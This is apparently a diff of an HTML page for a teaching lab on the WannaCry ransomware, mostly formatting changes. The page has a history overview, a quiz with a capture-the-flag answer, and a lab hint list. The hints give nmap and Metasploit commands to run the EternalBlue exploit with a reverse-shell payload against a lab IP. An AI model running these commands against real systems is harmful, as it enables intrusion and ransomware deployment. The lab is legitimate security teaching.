@@ -15,7 +15,8 @@
 
 	<!-- Terminal addon for resize -->
 	<script type="application/javascript" src="/src/Modules/js/fit-addon.js"></script>
-n	<!-- This NEEDS to be added to each page which you dont want to user to see unless signed in -->
+
+	<!-- This NEEDS to be added to each page which you dont want to user to see unless signed in -->
 	<script type="application/javascript" src="/src/authentication/js/userAuthenticationCheck.js"></script>
 
 </head>
@@ -26,7 +27,7 @@ n	<!-- This NEEDS to be added to each page which you dont want to user to see un
 			<!-- Description -->
 			<div class="resizableContainer" id="narrativeContainer">
 				<div class="containerContent">
-				<h2 id="moduleTitle">Module 1: Wannacry</h2>
+				  <h2 id="moduleTitle">Module 1: Wannacry</h2>
 				  <div style="background-color: #444; padding: 10px; border-radius: 4px; border: 2px solid #ddd;">
 					<div id="moduleSections">
 						<div class="moduleSection">
@@ -44,12 +45,21 @@ n	<!-- This NEEDS to be added to each page which you dont want to user to see un
 							</div>
 							<div class="spacer" style="height: 1em;"></div>
 							<div style="font-size: 18px; font-weight: normal; color: rgb(255, 215, 0); font-style: normal; text-decoration: underline;">
-								 Wannacry Overview:</a>
+								Wannacry Overview:</a>
 							</div>
 						</div>
 						<div class="moduleSection">
 							<div style="font-size: 16px; font-weight: normal; color: white; font-style: normal; font-style: normal;">
-								In May of 2017, the ransomware worm known as WannaCry infected numerous								organizations, causing significant damage. Over 200,000 systems were infected across								150 countries, with damages in the hundreds of millions of dollars. Prominent victims of								WannaCry included Boeing, Honda, the NHS of England and Scotland, and the								University of Montreal. The ransomware demanded a $300 Bitcoin payment in								exchange for the decryption of the victim's files, with the amount increasing over time if								left unpaid. On the same day of WannaCry's release, a hardcoded kill switch was								discovered and promptly registered by a security researcher. While this did not help								systems already infected, it effectively halted further spread of WannaCry within a								matter of hours.
+								In May of 2017, the ransomware worm known as WannaCry infected numerous
+								organizations, causing significant damage. Over 200,000 systems were infected across
+								150 countries, with damages in the hundreds of millions of dollars. Prominent victims of
+								WannaCry included Boeing, Honda, the NHS of England and Scotland, and the
+								University of Montreal. The ransomware demanded a $300 Bitcoin payment in
+								exchange for the decryption of the victim's files, with the amount increasing over time if
+								left unpaid. On the same day of WannaCry's release, a hardcoded kill switch was
+								discovered and promptly registered by a security researcher. While this did not help
+								systems already infected, it effectively halted further spread of WannaCry within a
+								matter of hours.
 							</div>
 						</div>
 						<div class="spacer" style="height: 1em;"></div>
@@ -58,7 +68,17 @@ n	<!-- This NEEDS to be added to each page which you dont want to user to see un
 						</div>
 						<div class="moduleSection">
 							<div style="font-size: 16px; font-weight: normal; color: white; font-style: normal; font-style: normal;">
-								WannaCry used the previously undisclosed EternalBlue vulnerability								(CVE-2017-0144), which takes advantage of SMBv1 mishandling specially crafted								packets, allowing for remote code execution.								A backdoor implant tool known as DoublePulsar is also used. The tool is able to								run in system memory, allowing it to stealthily install malware on the host.								Both EternalBlue and DoublePulsar were believed to be originally developed by								the NSA, and later stolen by the hacking group known as The Shadow Brokers,								meaning they were not publicly known. Such vulnerabilities are called “Zero Days”,								referring to the amount of days the vulnerability's existence has been known. Since								previously unknown, security professionals have to begin developing patches the same								day of release.
+								WannaCry used the previously undisclosed EternalBlue vulnerability
+								(CVE-2017-0144), which takes advantage of SMBv1 mishandling specially crafted
+								packets, allowing for remote code execution.
+								A backdoor implant tool known as DoublePulsar is also used. The tool is able to
+								run in system memory, allowing it to stealthily install malware on the host.
+								Both EternalBlue and DoublePulsar were believed to be originally developed by
+								the NSA, and later stolen by the hacking group known as The Shadow Brokers,
+								meaning they were not publicly known. Such vulnerabilities are called “Zero Days”,
+								referring to the amount of days the vulnerability's existence has been known. Since
+								previously unknown, security professionals have to begin developing patches the same
+								day of release.
 							</div>
 						</div>
 						<div class="spacer" style="height: 1em;"></div>
@@ -71,7 +91,21 @@ n	<!-- This NEEDS to be added to each page which you dont want to user to see un
 			  <div class="resizableContainer" id="terminalContainer">
 				<h2>Remote Terminal</h2>
 				<div id="terminalDescription" style="font-size: 16px; font-weight: normal; color: white;">
-								In this lab, you'll step into the role of an attacker aiming to compromise a small organization's network to deploy ransomware, using a WiFi-connected terminal.<br/>								Follow these hints:								<ul>									<li>Use the <code style="color: rgb(255, 215, 0);">help</code> command to see all available commands.									<li>The vulnerable machine's IP is <code style="color: rgb(255, 215, 0);">192.168.1.103</code>.									<li>Begin with <code style="color: rgb(255, 215, 0);">nmap -p 139,445 192.168.1.0/24</code> to scan for open SMB ports.									<li>Launch Metasploit with <code style="color: rgb(255, 215, 0);">msfconsole</code>, then use <code style="color: rgb(255, 215, 0);">use auxiliary/scanner/smb/smb_ms17_010</code>.									<li>Set the target with <code style="color: rgb(255, 215, 0);">set RHOST 192.168.1.103</code> and exploit with <code style="color: rgb(255, 215, 0);">run</code>.									<li>Further exploit with <code style="color: rgb(255, 215, 0);">use exploit/windows/smb/ms17_010_eternalblue</code>, set payload with <code style="color: rgb(255, 215, 0);">set payload generic/shell_reverse_tcp</code>, and execute with <code style="color: rgb(255, 215, 0);">exploit</code>.<br>								</ul>								Learn more about the commands being utilized:								<ul>									<li><a href="https://nmap.org/docs.html" style="color: rgb(255, 215, 0);">Nmap Documentation</a>									<li><a href="https://www.metasploit.com/documentation" style="color: rgb(255, 215, 0);">Metasploit Documentation</a>								</ul>
+					In this lab, you'll step into the role of an attacker aiming to compromise a small organization's network to deploy ransomware, using a WiFi-connected terminal.<br/>
+					Follow these hints:
+					<ul>
+					<li>Use the <code style="color: rgb(255, 215, 0);">help</code> command to see all available commands.
+					<li>The vulnerable machine's IP is <code style="color: rgb(255, 215, 0);">192.168.1.103</code>.
+					<li>Begin with <code style="color: rgb(255, 215, 0);">nmap -p 139,445 192.168.1.0/24</code> to scan for open SMB ports.
+					<li>Launch Metasploit with <code style="color: rgb(255, 215, 0);">msfconsole</code>, then use <code style="color: rgb(255, 215, 0);">use auxiliary/scanner/smb/smb_ms17_010</code>.
+					<li>Set the target with <code style="color: rgb(255, 215, 0);">set RHOST 192.168.1.103</code> and exploit with <code style="color: rgb(255, 215, 0);">run</code>.
+					<li>Further exploit with <code style="color: rgb(255, 215, 0);">use exploit/windows/smb/ms17_010_eternalblue</code>, set payload with <code style="color: rgb(255, 215, 0);">set payload generic/shell_reverse_tcp</code>, and execute with <code style="color: rgb(255, 215, 0);">exploit</code>.<br>
+					</ul>
+					Learn more about the commands being utilized:
+					<ul>
+					<li><a href="https://nmap.org/docs.html" style="color: rgb(255, 215, 0);">Nmap Documentation</a>
+					<li><a href="https://www.metasploit.com/documentation" style="color: rgb(255, 215, 0);">Metasploit Documentation</a>
+					</ul>
 				</div>
 				<div id="terminal"></div>
 			</div>
@@ -84,119 +118,119 @@ n	<!-- This NEEDS to be added to each page which you dont want to user to see un
 					<div>
 						<label class="prompt">What was the primary method used by WannaCry to encrypt victims' data?</label>
 						<div>
-							<input type="radio" id="Q1a" name="singleChoiceAnswer1" value=" Phishing emails" style="display: none;">
-							<label class="radio-label" for="Q1a"> Phishing emails</label>
+							<input type="radio" id="Q1a" name="singleChoiceAnswer1" value="Phishing emails" style="display: none;">
+							<label class="radio-label" for="Q1a">Phishing emails</label>
 						</div>
 						<div>
-							<input type="radio" id="Q1b" name="singleChoiceAnswer1" value=" USB drive infection" style="display: none;">
-							<label class="radio-label" for="Q1b"> USB drive infection</label>
+							<input type="radio" id="Q1b" name="singleChoiceAnswer1" value="USB drive infection" style="display: none;">
+							<label class="radio-label" for="Q1b">USB drive infection</label>
 						</div>
 						<div>
-							<input type="radio" id="Q1c" name="singleChoiceAnswer1" value=" Exploiting the EternalBlue vulnerability" style="display: none;">
-							<label class="radio-label" for="Q1c"> Exploiting the EternalBlue vulnerability</label>
+							<input type="radio" id="Q1c" name="singleChoiceAnswer1" value="Exploiting the EternalBlue vulnerability" style="display: none;">
+							<label class="radio-label" for="Q1c">Exploiting the EternalBlue vulnerability</label>
 						</div>
 						<div>
-							<input type="radio" id="Q1d" name="singleChoiceAnswer1" value=" Website drive-by download" style="display: none;">
-							<label class="radio-label" for="Q1d"> Website drive-by download</label>
+							<input type="radio" id="Q1d" name="singleChoiceAnswer1" value="Website drive-by download" style="display: none;">
+							<label class="radio-label" for="Q1d">Website drive-by download</label>
 						</div>
 					</div>
 					<div>
 						<label class="prompt">What type of software was WannaCry?</label>
 						<div>
-							<input type="radio" id="Q2a" name="singleChoiceAnswer2" value=" Adware" style="display: none;">
-							<label class="radio-label" for="Q2a"> Adware</label>
+							<input type="radio" id="Q2a" name="singleChoiceAnswer2" value="Adware" style="display: none;">
+							<label class="radio-label" for="Q2a">Adware</label>
 						</div>
 						<div>
-							<input type="radio" id="Q2b" name="singleChoiceAnswer2" value=" Ransomware" style="display: none;">
-							<label class="radio-label" for="Q2b"> Ransomware</label>
+							<input type="radio" id="Q2b" name="singleChoiceAnswer2" value="Ransomware" style="display: none;">
+							<label class="radio-label" for="Q2b">Ransomware</label>
 						</div>
 						<div>
-							<input type="radio" id="Q2c" name="singleChoiceAnswer2" value=" Spyware" style="display: none;">
-							<label class="radio-label" for="Q2c"> Spyware</label>
+							<input type="radio" id="Q2c" name="singleChoiceAnswer2" value="Spyware" style="display: none;">
+							<label class="radio-label" for="Q2c">Spyware</label>
 						</div>
 						<div>
-							<input type="radio" id="Q2d" name="singleChoiceAnswer2" value=" Antivirus" style="display: none;">
-							<label class="radio-label" for="Q2d"> Antivirus</label>
+							<input type="radio" id="Q2d" name="singleChoiceAnswer2" value="Antivirus" style="display: none;">
+							<label class="radio-label" for="Q2d">Antivirus</label>
 						</div>
 					</div>
 					<div>
 						<label class="prompt">What was the role of DoublePulsar in the WannaCry attack?</label>
 						<div>
-							<input type="radio" id="Q3a" name="singleChoiceAnswer3" value=" It was the decryption tool for victims" style="display: none;">
-							<label class="radio-label" for="Q3a"> It was the decryption tool for victims</label>
+							<input type="radio" id="Q3a" name="singleChoiceAnswer3" value="It was the decryption tool for victims" style="display: none;">
+							<label class="radio-label" for="Q3a">It was the decryption tool for victims</label>
 						</div>
 						<div>
-							<input type="radio" id="Q3b" name="singleChoiceAnswer3" value=" It acted as a firewall against antivirus software" style="display: none;">
-							<label class="radio-label" for="Q3b"> It acted as a firewall against antivirus software</label>
+							<input type="radio" id="Q3b" name="singleChoiceAnswer3" value="It acted as a firewall against antivirus software" style="display: none;">
+							<label class="radio-label" for="Q3b">It acted as a firewall against antivirus software</label>
 						</div>
 						<div>
-							<input type="radio" id="Q3c" name="singleChoiceAnswer3" value=" It was used to spread phishing emails" style="display: none;">
-							<label class="radio-label" for="Q3c"> It was used to spread phishing emails</label>
+							<input type="radio" id="Q3c" name="singleChoiceAnswer3" value="It was used to spread phishing emails" style="display: none;">
+							<label class="radio-label" for="Q3c">It was used to spread phishing emails</label>
 						</div>
 						<div>
-							<input type="radio" id="Q3d" name="singleChoiceAnswer3" value=" It served as a backdoor for malware installation" style="display: none;">
-							<label class="radio-label" for="Q3d"> It served as a backdoor for malware installation</label>
+							<input type="radio" id="Q3d" name="singleChoiceAnswer3" value="It served as a backdoor for malware installation" style="display: none;">
+							<label class="radio-label" for="Q3d">It served as a backdoor for malware installation</label>
 						</div>
 					</div>
 					<div>
 						<label class="prompt">How was WannaCry's spread significantly reduced?</label>
 						<div>
-							<input type="radio" id="Q4a" name="singleChoiceAnswer4" value=" Activation of a hardcoded kill switch" style="display: none;">
-							<label class="radio-label" for="Q4a"> Activation of a hardcoded kill switch</label>
+							<input type="radio" id="Q4a" name="singleChoiceAnswer4" value="Activation of a hardcoded kill switch" style="display: none;">
+							<label class="radio-label" for="Q4a">Activation of a hardcoded kill switch</label>
 						</div>
 						<div>
-							<input type="radio" id="Q4b" name="singleChoiceAnswer4" value=" A global antivirus update" style="display: none;">
-							<label class="radio-label" for="Q4b"> A global antivirus update</label>
+							<input type="radio" id="Q4b" name="singleChoiceAnswer4" value="A global antivirus update" style="display: none;">
+							<label class="radio-label" for="Q4b">A global antivirus update</label>
 						</div>
 						<div>
-							<input type="radio" id="Q4c" name="singleChoiceAnswer4" value=" Disconnecting infected computers from the internet" style="display: none;">
-							<label class="radio-label" for="Q4c"> Disconnecting infected computers from the internet</label>
+							<input type="radio" id="Q4c" name="singleChoiceAnswer4" value="Disconnecting infected computers from the internet" style="display: none;">
+							<label class="radio-label" for="Q4c">Disconnecting infected computers from the internet</label>
 						</div>
 						<div>
-							<input type="radio" id="Q4d" name="singleChoiceAnswer4" value=" A worldwide system reboot" style="display: none;">
-							<label class="radio-label" for="Q4d"> A worldwide system reboot</label>
+							<input type="radio" id="Q4d" name="singleChoiceAnswer4" value="A worldwide system reboot" style="display: none;">
+							<label class="radio-label" for="Q4d">A worldwide system reboot</label>
 						</div>
 					</div>
 					<div>
 						<label class="prompt">What could have prevented the WannaCry infection?</label>
 						<div>
-							<input type="radio" id="Q5a" name="singleChoiceAnswer5" value=" Installing more antivirus software" style="display: none;">
-							<label class="radio-label" for="Q5a"> Installing more antivirus software</label>
+							<input type="radio" id="Q5a" name="singleChoiceAnswer5" value="Installing more antivirus software" style="display: none;">
+							<label class="radio-label" for="Q5a">Installing more antivirus software</label>
 						</div>
 						<div>
-							<input type="radio" id="Q5b" name="singleChoiceAnswer5" value=" Disabling SMBv1 and applying security patches" style="display: none;">
-							<label class="radio-label" for="Q5b"> Disabling SMBv1 and applying security patches</label>
+							<input type="radio" id="Q5b" name="singleChoiceAnswer5" value="Disabling SMBv1 and applying security patches" style="display: none;">
+							<label class="radio-label" for="Q5b">Disabling SMBv1 and applying security patches</label>
 						</div>
 						<div>
-							<input type="radio" id="Q5c" name="singleChoiceAnswer5" value=" Changing network passwords frequently" style="display: none;">
-							<label class="radio-label" for="Q5c"> Changing network passwords frequently</label>
+							<input type="radio" id="Q5c" name="singleChoiceAnswer5" value="Changing network passwords frequently" style="display: none;">
+							<label class="radio-label" for="Q5c">Changing network passwords frequently</label>
 						</div>
 						<div>
-							<input type="radio" id="Q5d" name="singleChoiceAnswer5" value=" Using only mobile devices and tablets" style="display: none;">
-							<label class="radio-label" for="Q5d"> Using only mobile devices and tablets</label>
+							<input type="radio" id="Q5d" name="singleChoiceAnswer5" value="Using only mobile devices and tablets" style="display: none;">
+							<label class="radio-label" for="Q5d">Using only mobile devices and tablets</label>
 						</div>
 					</div>
 					<div>
 						<label class="prompt">What is the hidden flag after exploiting the vulnerable machine?</label>
 						<div>
-							<input type="radio" id="Q6a" name="singleChoiceAnswer6" value=" 35FW5x" style="display: none;">
-							<label class="radio-label" for="Q6a"> 35FW5x</label>
+							<input type="radio" id="Q6a" name="singleChoiceAnswer6" value="35FW5x" style="display: none;">
+							<label class="radio-label" for="Q6a">35FW5x</label>
 						</div>
 						<div>
-							<input type="radio" id="Q6b" name="singleChoiceAnswer6" value=" 208cE7" style="display: none;">
-							<label class="radio-label" for="Q6b"> 208cE7</label>
+							<input type="radio" id="Q6b" name="singleChoiceAnswer6" value="208cE7" style="display: none;">
+							<label class="radio-label" for="Q6b">208cE7</label>
 						</div>
 						<div>
-							<input type="radio" id="Q6c" name="singleChoiceAnswer6" value=" 0T801j" style="display: none;">
-							<label class="radio-label" for="Q6c"> 0T801j</label>
+							<input type="radio" id="Q6c" name="singleChoiceAnswer6" value="0T801j" style="display: none;">
+							<label class="radio-label" for="Q6c">0T801j</label>
 						</div>
 						<div>
-							<input type="radio" id="Q6d" name="singleChoiceAnswer6" value=" u46U0o" style="display: none;">
-							<label class="radio-label" for="Q6d"> u46U0o</label>
+							<input type="radio" id="Q6d" name="singleChoiceAnswer6" value="u46U0o" style="display: none;">
+							<label class="radio-label" for="Q6d">u46U0o</label>
 						</div>
 					</div>
 				</div>
-				<button class="submitQuestionsButton" id="module{modNum}" type="button" onclick="checkAnswers(this)">Check Answers</button>
+				<button class="submitQuestionsButton" id="module1" type="button" onclick="checkAnswers(this)">Check Answers</button>
 				<div id="resultMessage"></div>
 			</form>
 		</div>
